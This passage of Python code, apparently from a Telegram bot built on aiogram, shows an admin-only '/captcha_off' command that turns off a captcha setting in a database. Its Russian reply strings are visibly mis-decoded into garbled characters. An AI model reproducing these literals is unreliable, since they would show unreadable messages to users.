        await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫—É.")

@router.message(Command("captcha_off"))
async def cmd_captcha_off(message: Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥–µ.")
        return
    if db.set_setting('require_captcha', False):
        await message.answer("‚úÖ –ö–∞–ø—á–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞.")
    else:
        await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫—É.")